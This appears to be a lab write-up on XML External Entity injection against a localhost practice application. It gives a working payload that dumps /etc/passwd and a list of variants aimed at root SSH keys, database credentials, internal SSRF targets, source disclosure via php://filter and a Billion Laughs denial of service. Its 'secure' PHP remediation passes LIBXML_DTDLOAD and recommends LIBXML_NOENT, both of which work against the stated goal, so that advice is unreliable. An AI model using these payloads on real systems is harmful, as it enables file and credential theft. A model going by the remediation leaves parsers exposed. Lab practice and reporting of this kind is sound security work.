# XML External Entity Attack

## Vulnerability Report : XML External Entity (XXE) Attack

**Challenge Name:** XML External Entity Attack

### 1. Vulnerability Name & Description

**XML External Entity (XXE) Injection**

The application contains an XML External Entity (XXE) vulnerability that occurs when the XML parser is configured to process external entities without proper validation. This allows attackers to inject malicious XML content containing external entity declarations that the parser will resolve and process. XXE vulnerabilities enable attackers to read arbitrary files from the server filesystem, perform Server-Side Request Forgery (SSRF) attacks, cause Denial of Service, and in some cases achieve Remote Code Execution. The vulnerability exists because the application accepts XML input without disabling external entity processing.

### 2. Proof of Concept (PoC)

**Vulnerable Endpoint:** [http://localhost:1337/lab/xxe/xml/test.php](http://localhost:1337/lab/xxe/xml/test.php)

**Vulnerable Parameter:** XML POST body

**Payload Used for Local File Disclosure:**

```bash
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<city>
    <title>&ent;</title>
    <amount>293</amount>
</city>
```

**Attack Steps:**

1. Access the XML External Entity Attack page at [http://localhost:1337/lab/xxe/xml/](http://localhost:1337/lab/xxe/xml/)
2. Click "XML List" button to trigger XML processing functionality
3. Intercept the POST request to /lab/xxe/xml/test.php using Burp Suite
4. Observe normal XML request structure with city, title, and amount elements
5. Inject XXE payload with DOCTYPE declaration defining external entity "ent"
6. External entity references file:///etc/passwd using SYSTEM keyword
7. Replace title content with entity reference \&ent;
8. Forward the malicious request to the server
9. Server's XML parser processes the external entity declaration
10. Parser reads /etc/passwd file and substitutes content into \&ent; reference
11. Response displays complete /etc/passwd file contents with all system users
12. Successfully disclosed sensitive system file demonstrating XXE exploitation

**Alternative XXE Exploitation Payloads:**

```bash
# Read sensitive configuration files
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///var/www/html/config.php"> ]>
<city><title>&ent;</title></city>

# Read database credentials
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/mysql/my.cnf"> ]>
<city><title>&ent;</title></city>

# Read SSH private keys
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
<city><title>&ent;</title></city>

# SSRF - Port scanning internal network
<!DOCTYPE replace [<!ENTITY ent SYSTEM "<http://192.168.1.1:80>"> ]>
<city><title>&ent;</title></city>

# SSRF - Access internal services
<!DOCTYPE replace [<!ENTITY ent SYSTEM "<http://localhost:8080/admin>"> ]>
<city><title>&ent;</title></city>

# PHP filter to read source code in base64
<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php"> ]>
<city><title>&ent;</title></city>

# Billion Laughs DoS attack
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<city><title>&lol3;</title></city>
```

### 3. Impact Analysis

* **Arbitrary File Disclosure:** Attackers can read any file accessible to the web server user including configuration files, source code, and credentials
* **Sensitive Data Exposure:** Access to /etc/passwd, /etc/shadow, SSH keys, database credentials, API keys, and application secrets
* **Server-Side Request Forgery (SSRF):** Can make HTTP requests to internal services, cloud metadata endpoints, or external systems
* **Internal Network Reconnaissance:** Enumerate internal IP addresses, ports, and services not accessible from external network
* **Denial of Service (DoS):** Billion Laughs attack can exhaust server memory and CPU resources
* **Remote Code Execution:** In PHP environments with expect:// wrapper enabled, can achieve RCE
* **Confidentiality: CRITICAL** - Complete access to filesystem and internal network resources
* **Integrity: HIGH** - Can potentially modify data through SSRF attacks against internal APIs
* **Availability: HIGH** - DoS attacks can crash the XML parser or exhaust system resources
* **Cloud Metadata Exposure:** Can access AWS/Azure/GCP metadata endpoints to steal credentials and instance information
* **Database Compromise:** Exposed database credentials lead to complete data breach
* **Compliance Violations:** Unauthorized access to sensitive data violates GDPR, PCI-DSS, HIPAA regulations

### 4. CVSS 3.1 Score & Vector String

**CVSS Base Score:** 9.1 (Critical)

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H`

### 5. Risk Rating / Severity

**SEVERITY: CRITICAL**

**Risk Level:** IMMEDIATE ACTION REQUIRED

XXE vulnerabilities are particularly dangerous as they provide direct access to server filesystem and internal network resources. The ability to read arbitrary files and perform SSRF attacks makes this a high-priority security issue requiring immediate remediation.

### 6. Remediation / Mitigation Steps

1. **Disable External Entity Processing:**
   * Configure XML parsers to disable DTD processing and external entities
   * This is the most effective mitigation against XXE attacks
   * Implementation varies by programming language and XML library
2. **PHP libxml Configuration:**
   * Disable external entity loading using libxml\_disable\_entity\_loader(true)
   * Use LIBXML\_NOENT and LIBXML\_DTDLOAD flags properly

```bash
*// Secure XML parsing in PHP*
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_DTDLOAD | LIBXML_DTDATTR);
```

1. **Use Safe XML Parsers:**
   * Use JSON instead of XML when possible
   * If XML is required, use modern parsers with secure defaults
   * Avoid legacy parsers like SimpleXML without proper configuration
2. **Input Validation:**
   * Validate XML structure against strict schema (XSD)
   * Reject XML containing DOCTYPE declarations
   * Whitelist allowed XML elements and attributes
3. **Least Privilege Principle:**
   * Run web application with minimal filesystem permissions
   * Restrict read access to sensitive files like /etc/passwd, configuration files
   * Use chroot jails or containers to limit filesystem access
4. **Web Application Firewall (WAF):**
   * Deploy WAF rules to detect and block XXE payloads
   * Monitor for DOCTYPE declarations and ENTITY keywords in XML requests
   * Alert on suspicious file:// and http:// schemes in XML content

### 7. Screenshots / Logs / Payloads

<figure><img src="../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

* Screenshot 1: XML External Entity Attack page shows "XML List" button at [http://localhost:1337/lab/xxe/xml/](http://localhost:1337/lab/xxe/xml/), indicating XML processing functionality exists.

<figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

* Screenshot 2: Burp Suite intercepts POST request showing XXE payload with DOCTYPE declaration and entity reference \&ent;, response displays complete /etc/passwd file with system users confirming successful arbitrary file disclosure.
